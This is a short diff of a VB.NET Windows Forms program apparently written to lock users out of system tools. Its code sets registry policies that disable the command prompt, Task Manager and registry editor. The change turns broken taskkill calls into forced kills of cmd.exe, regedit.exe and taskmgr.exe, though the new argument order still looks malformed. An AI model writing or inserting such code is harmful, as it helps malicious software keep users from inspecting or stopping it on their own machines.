@@ -20,9 +20,9 @@ Public Class Form1
             Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System\ /v DisableCMD /t REG_DWORD /d 1")
             Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1")
             Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1")
-            Shell("taskkill /a cmd")
-            Shell("taskkill /a regedit")
-            Shell("taskkill /a taskmgr")
+            Shell("taskkill /im /f cmd.exe")
+            Shell("taskkill /im /f regedit.exe")
+            Shell("taskkill /im /f taskmgr.exe")
         End If
     End Sub
 
